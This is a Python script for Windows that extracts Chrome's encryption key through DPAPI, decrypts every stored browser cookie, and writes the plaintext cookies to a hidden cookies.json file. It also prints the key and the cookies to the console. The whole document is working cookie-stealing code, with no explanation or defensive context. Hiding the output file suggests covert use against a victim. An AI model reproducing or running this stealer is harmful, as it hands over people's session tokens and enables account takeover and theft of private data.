
import sqlite3
import os.path
import os
import json
import base64 
import win32crypt
from Crypto.Cipher import AES
import json
import win32api
import win32con

path = r'%LocalAppData%\Google\Chrome\User Data\Local State'
path = os.path.expandvars(path)
with open(path, 'r') as file:
    encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
encrypted_key = base64.b64decode(encrypted_key)                                       # Base64 decoding
encrypted_key = encrypted_key[5:]                                                     # Remove DPAPI
decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]  # Decrypt key
print(decrypted_key)

count=0
cookies=[]

pth = r'%LocalAppData%\Google\Chrome\User Data\Default\Cookies'
pth = os.path.expandvars(pth)
c = sqlite3.connect(pth)
c.text_factory = bytes
cursor = c.cursor()
select_statement = "SELECT name,host_key, encrypted_value,expires_utc,is_httponly,path,samesite,is_secure FROM cookies"
cursor.execute(select_statement)
history = cursor.fetchall()
for name,host_key, encrypted_value,expires_utc,is_httponly,path,samesite,is_secure in history:

    data = encrypted_value#bytes.fromhex('763130...') # the encrypted cookie
    nonce = data[3:3+12]
    ciphertext = data[3+12:-16]
    tag = data[-16:]


    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag) # the decrypted cookie

    jsonData={
        "domain":host_key.decode("utf-8"),
        "expirationDate":expires_utc,
        "httpOnly":is_httponly==1,
        "name":name.decode("utf-8"),
        "path":path.decode("utf-8"),
        "samesite":samesite,
        "secure":is_secure==1,
        "value":plaintext.decode("utf-8"),
        "storeId":"0",
        "hostOnly":False,
        "id":count,
    }
    count=count+1
    json.dumps(jsonData)
    cookies.append(jsonData)
f = open("cookies.json", "a")
f.write(json.dumps(cookies))
f.close()
win32api.SetFileAttributes("cookies.json", win32con.FILE_ATTRIBUTE_HIDDEN)
print(json.dumps(cookies))